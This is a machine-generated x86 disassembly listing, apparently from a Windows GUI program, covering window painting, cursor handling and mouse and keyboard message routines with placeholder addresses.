push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d4a2
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_44d4d4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_44c3b8
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_4034a4
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_4034a4
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_4034a4
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_4034a4
jmp r-xdata
sub_44d5c4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41725c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_44daac
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_44c804
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_44c818
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_4172c0
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44d7a4
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_44c38c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_4034a4
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_4530b8
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_449f60
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44d78f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_4530b8
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4530b8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44c214
test esi esi
je r-xdata
sub_44d7a4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_4034a4
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_44e628
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4034a4
mov eax esi
call sub_44c2bc
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_44c278
mov ecx eax
xor edx edx
xor eax eax
call sub_417298
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4034a4
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_44d848
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_44d878
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_44d8e4
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_44d9a4
sub_44d914
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_44d944
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_44c3b8
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44d970
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_44d9a4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_44da78
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44daac
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_44db44
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_464294
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_464294
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_44c414
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46dae4
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_4034a4
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_4641b8
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_4034a4
jmp r-xdata
sub_44dcd8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408c60
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408c8c
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_44c414
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408aa4
call sub_408a40
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408a40
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_44dd80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_44ddb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_44dd74
push ebp
call sub_44dd80
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44de00
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_44de8c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_44dec4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44d944
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_464128
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4034a4
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_464128
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4034a4
sub_44df48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44c3e4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44caac
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_44dec4
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_44df94
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44c3e4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44dfb0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44c3e4
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44caac
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44dec4
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_4034a4
sub_44e008
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_44d8e4
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44d878
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44d8e4
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_44e0a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44dec4
pop esi
pop ebx
retn
sub_44e0c9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44dec4
pop esi
pop ebx
retn
sub_44e0ef
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44dec4
pop esi
pop ebx
retn
sub_44e119
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44dec4
pop esi
pop ebx
retn
sub_44e144
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_44e174
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_44d944
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_464128
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_4034a4
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_464128
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_4034a4
sub_44e1ec
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_44e224
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_464128
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_4034a4
sub_44e25c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_44caac
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44e224
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406d24
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4034a4
sub_44e2d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44e224
pop esi
pop ebx
retn
sub_44e2f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44e224
pop esi
pop ebx
retn
sub_44e314
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_464128
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_4034a4
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_457a80
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e36c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44ca9c
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_44caac
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_44da78
pop esi
retn
sub_44e3ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_44daac
sub_44e45c
test [ eax + 0x1c ] 0x10
